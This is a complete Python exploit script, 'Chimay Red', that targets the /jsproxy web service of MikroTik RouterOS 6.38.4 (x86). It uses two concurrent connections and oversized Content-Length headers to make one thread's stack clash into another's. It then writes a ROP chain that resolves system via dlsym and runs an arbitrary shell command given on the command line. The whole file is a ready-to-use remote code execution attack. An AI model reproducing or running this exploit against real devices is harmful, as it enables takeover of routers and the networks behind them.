#!/usr/bin/env python2

# Mikrotik Chimay Red Stack Clash Exploit by wsxarcher (based on BigNerd95 POC)

# tested on RouterOS 6.38.4 (x86)

# ASLR enabled on libs only
# DEP enabled

import socket, time, sys, struct
from pwn import *
import ropgadget

AST_STACKSIZE = 0x20000 # stack size per thread (128 KB)
SKIP_SPACE    =  0x1000 # 4 KB of "safe" space for the stack of thread 2
ROP_SPACE     =  0x8000 # we can send 32 KB of ROP chain!

ALIGN_SIZE    = 0x10 # alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain

context(arch="i386", os="linux", log_level="WARNING")

gadgets = dict()
plt = dict()
strings = dict()
system_chunks = []
cmd_chunks = []

def makeHeader(num):
    return bytearray("POST /jsproxy HTTP/1.1\r\nContent-Length: ") + bytearray(str(num)) + bytearray("\r\n\r\n")

def makeSocket(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
    except:
        print("Error connecting to socket")
        sys.exit(-1)
    print("Connected")
    time.sleep(0.5)
    return s

def socketSend(s, data):
    try:
        s.send(data)
    except:
        print("Error sending data")
        sys.exit(-1)
    print("Sent")
    time.sleep(0.5)

def ropCall(function_address, *arguments):

    payload = struct.pack('<L', function_address)

    num_arg = len(arguments)

    if num_arg > 0:

        if num_arg == 1:
            ret_gadget = gadgets['p']
        elif num_arg == 2:
            ret_gadget = gadgets['pp']
        elif num_arg == 3:
            ret_gadget = gadgets['ppp']
        elif num_arg == 4:
            ret_gadget = gadgets['pppp']
        else:
            raise

        payload += struct.pack('<L', ret_gadget)

        for arg in arguments:
            payload += struct.pack('<L', arg)

    return payload

# pwntools filters out JOP gadgets
# https://github.com/Gallopsled/pwntools/blob/5d537a6189be5131e63144e20556302606c5895e/pwnlib/rop/rop.py#L1074
def ropSearchJmp(elf, instruction):
    oldargv = sys.argv
    sys.argv = ['ropgadget', '--binary', elf.path, '--only', 'jmp']
    args = ropgadget.args.Args().getArgs()
    core = ropgadget.core.Core(args)
    core.do_binary(elf.path)
    core.do_load(0)

    sys.argv = oldargv

    for gadget in core._Core__gadgets:
        address = gadget['vaddr'] - elf.load_addr + elf.address
        if gadget['gadget'] == instruction:
            return address

    raise

def loadOffsets(binary, shellCmd):
    elf = ELF(binary)
    rop = ROP(elf)

    # www PLT symbols
    plt["strncpy"] = elf.plt['strncpy']
    plt["dlsym"]   = elf.plt['dlsym']

    # Gadgets to clean the stack from arguments
    gadgets['pppp'] = rop.search(regs=["ebx", "esi", "edi", "ebp"]).address
    gadgets['ppp'] = rop.search(regs=["ebx", "ebp"], move=(4*4)).address
    gadgets['pp'] = rop.search(regs=["ebx", "ebp"]).address
    gadgets['p'] = rop.search(regs=["ebp"]).address

    # Gadget to jump on the result of dlsym (address of system)
    gadgets['jeax'] = ropSearchJmp(elf, "jmp eax")

    system_chunks.extend(searchStringChunksLazy(elf, "system\x00"))
    cmd_chunks.extend(searchStringChunksLazy(elf, shellCmd + "\x00"))

    # get the address of the first writable segment to store strings
    writable_address = elf.writable_segments[0].header.p_paddr

    strings['system'] = writable_address
    strings['cmd']    = writable_address + 0xf

def generateStrncpyChain(dst, chunks):
    chain = ""
    offset = 0
    for (address, length) in chunks:
        chain += ropCall(plt["strncpy"], dst + offset, address, length)
        offset += length

    return chain

# only search for single chars
def searchStringChunksLazy(elf, string):
    chunks = []
    for b in string:
        res = [_ for _ in elf.search(b)]
        if len(res) > 0:
            chunks.append((res[0], 1))
        else:
            raise

    if len(string) != len(chunks):
        raise

    return chunks

# [bugged, some problem with dots, not used]
# search chunks of string
def searchStringChunks(elf, string):
    chunks = []
    total = len(string)

    if string == "":
        raise

    looking = string

    while string != "":
        results = [_ for _ in elf.search(looking)]

        if len(results) > 0:
            chunks.append((results[0], len(looking)))
            string = string[len(looking):]
            looking = string
        else:   # search failed
            looking = looking[:-1] # search again removing last char

    check_length = 0
    for (address, length) in chunks:
        check_length = check_length + length

    if check_length == total:
        return chunks
    else:
        raise

def buildROP(binary, shellCmd):
    loadOffsets(binary, shellCmd)

    # ROP chain
    exploit  = generateStrncpyChain(strings['system'], system_chunks) # w_segment = "system"
    exploit += generateStrncpyChain(strings['cmd'], cmd_chunks)       # w_segment = "bash cmd"
    exploit += ropCall(plt["dlsym"], 0, strings['system']) # dlsym(0, "system"), eax = libc.system
    exploit += ropCall(gadgets['jeax'], strings['cmd'])    # system("cmd")

    # The server is automatically restarted after 3 secs, so we make it crash with a random address
    exploit += struct.pack('<L', 0x13371337)

    return exploit

def stackClash(ip, port, ropChain):

    print("Opening 2 sockets")

    # 1) Start 2 threads
    # open 2 socket so 2 threads are created
    s1 = makeSocket(ip, port) # socket 1, thread A
    s2 = makeSocket(ip, port) # socket 2, thread B

    print("Stack clash...")

    # 2) Stack Clash
    # 2.1) send post header with Content-Length bigger than AST_STACKSIZE to socket 1 (thread A)
    socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)

    # 2.2) send some bytes as post data to socket 1 (thread A)
    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved

    # 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
    socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned

    print("Sending payload")

    # 3) Send ROP chain
    socketSend(s1, ropChain) # thread A writes the ROP chain in the stack of thread B

    print("Starting exploit")

    # 4) Start ROP chain
    s2.close() # close socket 2 to return from the function of thread B and start ROP chain

    print("Done!")

if __name__ == "__main__":
    if len(sys.argv) == 5:
        ip       = sys.argv[1]
        port     = int(sys.argv[2])
        binary   = sys.argv[3]
        shellCmd = sys.argv[4]

        print("Building ROP chain...")
        ropChain = buildROP(binary, shellCmd)
        print("The ROP chain is " + str(len(ropChain)) + " bytes long (" + str(ROP_SPACE) + " bytes available)")

        stackClash(ip, port, ropChain)
    else:
        print("Usage: ./StackClashROPsystem.py IP PORT binary shellcommand")
